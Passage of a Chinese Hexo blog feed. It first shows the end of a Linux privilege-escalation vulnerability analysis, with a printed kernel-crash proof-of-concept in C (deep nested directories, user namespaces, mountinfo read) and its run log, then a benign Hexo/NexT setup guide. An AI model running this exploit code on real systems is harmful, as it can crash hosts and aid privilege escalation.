class="keyword">size_t</span> count;</span><br><span class="line">    <span class="keyword">int</span> <span class="keyword">delete</span>;</span><br><span class="line">&#125; t_userns;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">userns_fn</span><span class="params">(<span class="keyword">void</span> * <span class="keyword">const</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!arg) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">const</span> t_userns * <span class="keyword">const</span> userns = arg;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> sock = userns-&gt;socks[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">close</span>(userns-&gt;socks[<span class="number">0</span>])) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">send_recv_state</span>(sock, <span class="literal">NULL</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> n;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chdir</span>(bigdir)) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">for</span> (n = <span class="number">0</span>; n &lt;= userns-&gt;count / (<span class="number">1</span> + (<span class="built_in"><span class="keyword">sizeof</span></span>(onedir)<span class="number">-1</span>) * <span class="number">4</span>); n++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">chdir</span>(onedir)) <span class="built_in">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> device[] = <span class="string">&quot;./device.XXXXXX&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">mkdtemp</span>(device)) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">char</span> mpoint[] = <span class="string">&quot;/tmp/mpoint.XXXXXX&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">mkdtemp</span>(mpoint)) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mount</span>(device, mpoint, <span class="literal">NULL</span>, MS_BIND, <span class="literal">NULL</span>)) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (userns-&gt;<span class="keyword">delete</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">rmdir</span>(device)) <span class="built_in">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>)) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">send_recv_state</span>(sock, <span class="string">&quot;B&quot;</span>, <span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">&quot;/proc/self/mountinfo&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt;= <span class="number">-1</span>) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">1UL</span> &lt;&lt; <span class="number">20</span>];</span><br><span class="line">    <span class="keyword">size_t</span> len = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="keyword">ssize_t</span> nbr = <span class="built_in">read</span>(fd, buf, <span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbr &lt;= <span class="number">0</span>) <span class="built_in">die</span>();</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="keyword">char</span> * nl = <span class="built_in">memchr</span>(buf, <span class="string">&#x27;\n&#x27;</span>, nbr);</span><br><span class="line">            <span class="keyword">if</span> (!nl) <span class="keyword">break</span>;</span><br><span class="line">            nl++;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">memmem</span>(buf, nl - buf, <span class="string">&quot;\\134&quot;</span>, <span class="number">4</span>)) <span class="built_in">die</span>();</span><br><span class="line">            nbr -= nl - buf;</span><br><span class="line">            <span class="built_in">memmove</span>(buf, nl, nbr);</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        len += nbr;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memmem</span>(buf, nbr, <span class="string">&quot;\\134&quot;</span>, <span class="number">4</span>)) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">send_recv_state</span>(sock, <span class="string">&quot;D&quot;</span>, <span class="string">&#x27;E&#x27;</span>);</span><br><span class="line">    <span class="built_in">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">update_id_map</span><span class="params">(<span class="keyword">char</span> * <span class="keyword">const</span> mapping, <span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> map_file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> map_len = <span class="built_in">strlen</span>(mapping);</span><br><span class="line">    <span class="keyword">if</span> (map_len &gt;= SSIZE_MAX) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (map_len &lt;= <span class="number">0</span>) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; map_len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (mapping[i] == <span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            mapping[i] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> fd = <span class="built_in">open</span>(map_file, O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt;= <span class="number">-1</span>) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(fd, mapping, map_len) != (<span class="keyword">ssize_t</span>)map_len) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">close</span>(fd)) <span class="built_in">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">proc_setgroups_write</span><span class="params">(<span class="keyword">const</span> <span class="keyword">pid_t</span> child_pid, <span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> str_len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span> (str_len &gt;= SSIZE_MAX) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (str_len &lt;= <span class="number">0</span>) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> setgroups_path[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(setgroups_path, <span class="built_in"><span class="keyword">sizeof</span></span>(setgroups_path), <span class="string">&quot;/proc/%ld/setgroups&quot;</span>, (<span class="keyword">long</span>)child_pid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> fd = <span class="built_in">open</span>(setgroups_path, O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt;= <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fd != <span class="number">-1</span>) <span class="built_in">die</span>();</span><br><span class="line">        <span class="keyword">if</span> (errno != ENOENT) <span class="built_in">die</span>();</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">write</span>(fd, str, str_len) != (<span class="keyword">ssize_t</span>)str_len) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">close</span>(fd)) <span class="built_in">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">fork_userns</span><span class="params">(t_userns * <span class="keyword">const</span> userns, <span class="keyword">const</span> <span class="keyword">size_t</span> size, <span class="keyword">const</span> <span class="keyword">int</span> <span class="keyword">delete</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">size_t</span> stack_size = (<span class="number">1UL</span> &lt;&lt; <span class="number">20</span>) + <span class="number">2</span> * PAGE_SIZE;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> * stack = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (!stack) &#123;</span><br><span class="line">        stack = <span class="built_in">mmap</span>(<span class="literal">NULL</span>, stack_size, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!stack || stack == MAP_FAILED) <span class="built_in">die</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mprotect</span>(stack + PAGE_SIZE, stack_size - <span class="number">2</span> * PAGE_SIZE, PROT_READ | PROT_WRITE)) <span class="built_in">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!userns) <span class="built_in">die</span>();</span><br><span class="line">    userns-&gt;count = size / <span class="number">2</span>;</span><br><span class="line">    userns-&gt;<span class="keyword">delete</span> = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">socketpair</span>(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, userns-&gt;socks)) <span class="built_in">die</span>();</span><br><span class="line">    userns-&gt;pid = <span class="built_in">clone</span>(userns_fn, stack + stack_size - PAGE_SIZE, CLONE_NEWUSER | CLONE_NEWNS | SIGCHLD, userns);</span><br><span class="line">    <span class="keyword">if</span> (userns-&gt;pid &lt;= <span class="number">-1</span>) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">close</span>(userns-&gt;socks[<span class="number">1</span>])) <span class="built_in">die</span>();</span><br><span class="line">    userns-&gt;socks[<span class="number">1</span>] = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> map_path[<span class="number">64</span>], map_buf[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(map_path, <span class="built_in"><span class="keyword">sizeof</span></span>(map_path), <span class="string">&quot;/proc/%ld/uid_map&quot;</span>, (<span class="keyword">long</span>)userns-&gt;pid);</span><br><span class="line">    <span class="built_in">snprintf</span>(map_buf, <span class="built_in"><span class="keyword">sizeof</span></span>(map_buf), <span class="string">&quot;0 %ld 1&quot;</span>, (<span class="keyword">long</span>)<span class="built_in">getuid</span>());</span><br><span class="line">    <span class="built_in">update_id_map</span>(map_buf, map_path);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">proc_setgroups_write</span>(userns-&gt;pid, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line">    <span class="built_in">snprintf</span>(map_path, <span class="built_in"><span class="keyword">sizeof</span></span>(map_path), <span class="string">&quot;/proc/%ld/gid_map&quot;</span>, (<span class="keyword">long</span>)userns-&gt;pid);</span><br><span class="line">    <span class="built_in">snprintf</span>(map_buf, <span class="built_in"><span class="keyword">sizeof</span></span>(map_buf), <span class="string">&quot;0 %ld 1&quot;</span>, (<span class="keyword">long</span>)<span class="built_in">getgid</span>());</span><br><span class="line">    <span class="built_in">update_id_map</span>(map_buf, map_path);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">send_recv_state</span>(*userns-&gt;socks, <span class="string">&quot;A&quot;</span>, <span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">wait_userns</span><span class="params">(t_userns * <span class="keyword">const</span> userns)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!userns) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">kill</span>(userns-&gt;pid, SIGKILL)) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> status = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">waitpid</span>(userns-&gt;pid, &amp;status, <span class="number">0</span>) != userns-&gt;pid) <span class="built_in">die</span>();</span><br><span class="line">    userns-&gt;pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">WIFSIGNALED</span>(status)) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WTERMSIG</span>(status) != SIGKILL) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">close</span>(*userns-&gt;socks)) <span class="built_in">die</span>();</span><br><span class="line">    *userns-&gt;socks = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> * <span class="keyword">const</span> argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) <span class="built_in">die</span>();</span><br><span class="line">    bigdir = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> (*bigdir != <span class="string">&#x27;/&#x27;</span>) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bigdir: %s\n&quot;</span>, bigdir);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in"><span class="keyword">sizeof</span></span>(onedir) != <span class="number">256</span>) <span class="built_in">die</span>();</span><br><span class="line">    <span class="built_in">memset</span>(onedir, <span class="string">&#x27;\\&#x27;</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(onedir)<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (onedir[<span class="built_in"><span class="keyword">sizeof</span></span>(onedir)<span class="number">-1</span>] != <span class="string">&#x27;\0&#x27;</span>) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;onedir: %s\n&quot;</span>, onedir);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;creating directories, please wait...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mkdir</span>(bigdir, S_IRWXU) &amp;&amp; errno != EEXIST) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chdir</span>(bigdir)) <span class="built_in">die</span>();</span><br><span class="line">    <span class="keyword">size_t</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %d\n&quot;</span>, ((<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>) / (<span class="number">1</span> + (<span class="built_in"><span class="keyword">sizeof</span></span>(onedir)<span class="number">-1</span>) * <span class="number">4</span>)));</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>) / (<span class="number">1</span> + (<span class="built_in"><span class="keyword">sizeof</span></span>(onedir)<span class="number">-1</span>) * <span class="number">4</span>); i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mkdir</span>(onedir, S_IRWXU) &amp;&amp; errno != EEXIST) <span class="built_in">die</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">chdir</span>(onedir)) <span class="built_in">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">chdir</span>(<span class="string">&quot;/&quot;</span>)) <span class="built_in">die</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> t_userns userns;</span><br><span class="line">    fork_userns(&amp;userns, (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;crashing...&quot;</span>);</span><br><span class="line">    <span class="built_in">send_recv_state</span>(*userns.socks, <span class="string">&quot;C&quot;</span>, <span class="string">&#x27;D&#x27;</span>);</span><br><span class="line">    <span class="built_in">wait_userns</span>(&amp;userns);</span><br><span class="line">    <span class="built_in">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译运行代码：<code>bigdir</code>是用户输入的参数，程序将创建一个<code>bigdir</code>目录。因此<code>bigdir</code>必须是用户有<strong>读写权限</strong>的位置。<code>onedir</code>就是程序自己指定的，在<code>bigdir</code>目录里将要创建的目录名称。</p><p>这个程序的主要功能就是，先创建一个<code>bigdir</code>，然后在<code>bigdir</code>里再创建<code>onedir</code>，接着在这个<code>onedir</code>创建新的<code>onedir</code>，如此循环<code>size=1051657</code>次。最后再进行挂载，删除一系列操作。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># su test</span><br><span class="line">$ gcc exploit.c -o /tmp/exploit</span><br><span class="line">$ chmod +x /tmp/exploit</span><br><span class="line">$ cd /tmp</span><br><span class="line">$ ./exploit /tmp/test  </span><br><span class="line">bigdir: /tmp/test</span><br><span class="line">onedir: \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\</span><br><span class="line">creating directories, please wait...</span><br><span class="line">size: 1051657</span><br><span class="line">died in main: 231</span><br><span class="line"># du -sh /tmp/test</span><br><span class="line">2.5G/tmp/test</span><br></pre></td></tr></table></figure><p>执行失败，好家伙，我磁盘空间用完了，但是文件夹还没循环创建完，因此失败了。</p><p>我懒得再给我虚拟机扩容，增大tmp容量，反正原理就差不多那样。先去玩耍不管了~</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 提权 </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客搭建问题汇总</title>
      <link href="/2021/09/11/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/"/>
      <url>/2021/09/11/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>分享搭建博客时遇到的各种问题解决方案和五花八门的功能实现方式</p><span id="more"></span><p>本博客是由hexo-next搭建完成，搭建环境为win10.</p><p>hexo版本：5.4.0</p><p>next版本：7.8.0</p><h2 id="hexo上传博文"><a href="#hexo上传博文" class="headerlink" title="hexo上传博文"></a>hexo上传博文</h2><p>在hexo的根目录<code>/blog</code>下运行bash，依次执行下列命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>接着就可以使用<code>https://mujinchaorong-caeser.github.io/</code>网址查看我的博客啦。（ps：github更新有延迟，可能需要上传后再等几分钟，才能看到更改后的效果。）</p><h2 id="hexo添加分类及标签"><a href="#hexo添加分类及标签" class="headerlink" title="hexo添加分类及标签"></a>hexo添加分类及标签</h2><p>参考链接：<a href="https://tohugo.com/2021/01/26/%E5%B7%A5%E5%85%B7%E9%85%8D%E7%BD%AE/Hexo%E6%B7%BB%E5%8A%A0%E5%88%86%E7%B1%BB%E5%8F%8A%E6%A0%87%E7%AD%BE%EF%BC%88%E5%9C%A8Next%E4%B8%BB%E9%A2%98%E4%B8%8B%EF%BC%89/">Hexo添加分类及标签（在Next主题下）</a></p><h2 id="hexo添加博文"><a href="#hexo添加博文" class="headerlink" title="hexo添加博文"></a>hexo添加博文</h2><ol><li><p>在本机上用markdown编辑器写好博文后，保存到<code>/blog/source/_posts</code>下，名为<code>xxx.md</code>。此处的<code>/blog</code>是我hexo的根目录。</p></li><li><p>用sublime打开该博文，并在开头添加标题、分类等信息，然后上传博文即可。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: xxxxx</span><br><span class="line">categories:</span><br><span class="line"><span class="section"> - xxx</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="生成摘要"><a href="#生成摘要" class="headerlink" title="生成摘要"></a>生成摘要</h2><p>摘要可以自动生成或者手动生成，但我个人不喜欢自动生成的摘要。所以这里只分享手动文章摘要设置，我们只需在想显示为摘要的内容之后添加<code>&lt;!-- more --&gt;</code>即可。像下面这样：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: hello world</span><br><span class="line">data: 2021-9-11</span><br><span class="line">tags:</span><br><span class="line"><span class="section"> - hello</span></span><br><span class="line"><span class="section">---</span></span><br><span class="line">我是短小精悍的文章摘要(<span class="emphasis">*^▽^*</span>)</span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line">文章正文</span><br></pre></td></tr></table></figure><h2 id="生成博文目录"><a href="#生成博文目录" class="headerlink" title="生成博文目录"></a>生成博文目录</h2><p>参考链接：<a href="https://tding.top/archives/2bd6d82.html">next7.7.0后的特性与变化</a></p><p>在很多网上教程里，目录功能都需要在<code>hexo/next/source/css/_custom/_custom.styl</code>里修改，但是next7.7.0之后，很多文件都发生了改变，这个文件就已经找不到啦。所以真正的做法是在<code>blog/source/_data</code>创建<code>styles.styl</code>文件，并在文件中加入：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TOC目录默认全部展开</span></span><br><span class="line"><span class="selector-class">.post-toc</span> <span class="selector-class">.nav</span> <span class="selector-class">.nav-child</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后去主题配置文件中关闭目录的数字编号：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure><h2 id="开启字数与阅读时长统计"><a href="#开启字数与阅读时长统计" class="headerlink" title="开启字数与阅读时长统计"></a>开启字数与阅读时长统计</h2><p>在hexo根目录下bash执行<code>npm install hexo-symbols-count-time</code></p><p>修改主题配置文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">symbols_count_time:</span></span><br><span class="line">  <span class="attr">separated_meta:</span> <span class="literal">true</span> <span class="comment"># 是否换行显示 字数统计 及 阅读时长</span></span><br><span class="line">  <span class="attr">item_text_post:</span> <span class="literal">true</span> <span class="comment"># 文章 字数统计 阅读时长 使用图标 还是 文本表示</span></span><br><span class="line">  <span class="attr">item_text_total:</span> <span class="literal">false</span> <span class="comment"># 博客底部统计 字数统计 阅读时长 使用图标 还是 文本表示</span></span><br></pre></td></tr></table></figure><h2 id="添加评论功能"><a href="#添加评论功能" class="headerlink" title="添加评论功能"></a>添加评论功能</h2><p>使用valine最大的好处是可以匿名评论，而无需注册。</p><p>我们首先在<a href="https://leancloud.app/">LeanCloud官网</a>注册账号，这个需要个人实名认证。然后创建应用并设置，这些步骤都可以参考<a href="https://qianfanguojin.top/2019/07/23/Hexo%E5%8D%9A%E5%AE%A2%E8%BF%9B%E9%98%B6%EF%BC%9A%E4%B8%BANext%E4%B8%BB%E9%A2%98%E6%B7%BB%E5%8A%A0Valine%E8%AF%84%E8%AE%BA%E7%B3%BB%E7%BB%9F/">next主题添加valine评论</a>。</p><p>在主题配置页面，设置如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">valine:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">appid:</span> <span class="string">粘贴id</span> <span class="comment"># Your leancloud application appid</span></span><br><span class="line">  <span class="attr">appkey:</span> <span class="string">粘贴key</span> <span class="comment"># Your leancloud application appkey</span></span><br><span class="line">  <span class="attr">notify:</span> <span class="literal">false</span> <span class="comment"># Mail notifier</span></span><br><span class="line">  <span class="attr">verify:</span> <span class="literal">false</span> <span class="comment"># Verification code</span></span><br><span class="line">  <span class="attr">placeholder:</span> <span class="string">欢迎讨论交流...</span> <span class="comment"># Comment box placeholder</span></span><br><span class="line">  <span class="attr">avatar:</span> <span class="string">mm</span> <span class="comment"># Gravatar style</span></span><br><span class="line">  <span class="attr">guest_info:</span> <span class="string">nick,mail,link</span> <span class="comment"># Custom comment header</span></span><br><span class="line">  <span class="attr">pageSize:</span> <span class="number">10</span> <span class="comment"># Pagination size</span></span><br><span class="line">  <span class="attr">language:</span> <span class="comment"># Language, available values: en, zh-cn</span></span><br><span class="line">  <span class="attr">visitor:</span> <span class="literal">true</span> <span class="comment"># Article reading statistic</span></span><br><span class="line">  <span class="attr">comment_count:</span> <span class="literal">true</span> <span class="comment"># If false, comment count will only be displayed in post page, not in home page</span></span><br><span class="line">  <span class="attr">recordIP:</span> <span class="literal">false</span> <span class="comment"># Whether to record the commenter IP</span></span><br><span class="line">  <span class="attr">serverURLs:</span> <span class="comment"># When the custom domain name is enabled, fill it in here (it will be detected automatically by default, no need to fill in)</span></span><br><span class="line">  <span class="comment">#post_meta_order: 0</span></span><br></pre></td></tr></table></figure><h2 id="后台管理评论"><a href="#后台管理评论" class="headerlink" title="后台管理评论"></a>后台管理评论</h2><p>进入<a href="https://leancloud.app/">LeanCloud官网</a>，登陆你之前注册的账号，查看<code>数据存储</code>中的<code>Comment</code>类里的<code>ObjectID</code>。不过评论都是html格式的哦。</p><h2 id="禁止留言"><a href="#禁止留言" class="headerlink" title="禁止留言"></a>禁止留言</h2><p>在禁止留言的文章或者板块添加<code>comments</code>并赋值为<code>false</code></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: tags</span><br><span class="line">date: 2019-01-28 10:02:04</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line"><span class="section">comments: false</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>其实还有很多功能想要添加，比如说增加一个live2d页面看板娘，将动态背景换成我喜欢的动漫图片等等，不过慢慢来吧，我现在要去享受周末啦~</p>]]></content>
      
      
      <categories>
          
          <category> 实践真知 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Git使用问题</title>
      <link href="/2021/09/11/Git%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98/"/>
      <url>/2021/09/11/Git%E4%BD%BF%E7%94%A8%E9%97%AE%E9%A2%98/</url>
      
